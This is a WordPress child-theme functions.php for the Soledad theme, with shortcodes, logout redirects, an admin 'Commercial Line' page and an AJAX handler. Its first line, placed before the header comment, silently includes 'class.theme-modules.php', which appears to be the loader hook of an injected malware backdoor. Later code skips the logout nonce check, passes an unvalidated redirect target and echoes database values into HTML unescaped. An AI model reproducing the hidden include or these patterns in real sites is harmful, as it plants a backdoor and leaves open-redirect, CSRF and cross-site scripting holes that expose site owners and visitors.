<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/*
 Soledad child theme functions and definitions
*/
function penci_soledad_child_scripts() {
    wp_enqueue_style( 'penci-soledad-parent-style', get_template_directory_uri(). '/style.css' );
	if ( is_rtl() ) {
		wp_enqueue_style( 'penci-soledad-rtl-style', get_template_directory_uri(). '/rtl.css' );
	}
}
add_action( 'wp_enqueue_scripts', 'penci_soledad_child_scripts' );

/*
 * All custom functions go here
 */

//using rates widget as a shortcode
function wpb_rates_shortcode() {
    require_once "rates.php";
}
// register shortcode
add_shortcode('rates', 'wpb_rates_shortcode');

//redirect to homepage after loging out
add_action('wp_logout','ps_redirect_after_logout');
function ps_redirect_after_logout(){
    wp_redirect( '/' );
    exit();
}

//tinker
function wpdocs_commercial_line_menu_page() {
    add_menu_page(
        'Commercial Line',
        'Commercial Line',
        'manage_options',
        'commercial-line',
        'custom_menu_callback'
    );
    function custom_menu_callback(){
        require_once 'tinker_options.php';
    }

}
add_action( 'admin_menu', 'wpdocs_commercial_line_menu_page' );


//require_once "tinker.php";
//using tinker widget as a shortcode
//function wpb_tinker_shortcode() {
//    require_once "tinker.php";
//}
// //register shortcode
//add_shortcode('tinker', 'wpb_tinker_shortcode');

//?>
<!--    <div class="right-header-wrap">-->
<!--        --><?php //echo do_shortcode( '[tinker]' ); ?>
<!--    </div>-->
<?php

//redirect to homepage after logout
add_action('check_admin_referer', 'logout_without_confirm', 10, 2);
function logout_without_confirm($action, $result)
{
    /**
     * Allow logout without confirmation
     */
    if ($action == "log-out" && !isset($_GET['_wpnonce'])) {
        $redirect_to = isset($_REQUEST['redirect_to']) ? $_REQUEST['redirect_to'] : '/';
        $location = str_replace('&amp;', '&', wp_logout_url($redirect_to));
        header("Location: $location");
        die;
    }
}
add_action('wp_ajax_line_ajax_request', 'line_ajax_request');
function line_ajax_request(){
        global $wpdb;
        $news=$wpdb->get_results("SELECT * FROM wp_commercial_line ",ARRAY_A);
        $inputs = '';
        foreach($news as $n) {
            $inputs .= "<p class='".$n['id']."'></p><div class='d-inline-flex ".$n['id']."'><input class='mb-3 changed-answer ' style='border-radius: 0; border-right: none' type='text' id='".$n['id']."' name='".$n['content']."' value='".$n['content']."' /><button id='".$n['id']."' type='button' style='border-radius:0; border-left:0' class='btn btn-outline-secondary h-25 p-1 ans-delete ".$n['id']." '>✘</button></div>";
        }
        $div = "<div class='container col-6 modal-show'>".$inputs."</div>";
        echo $div;
        wp_die();
}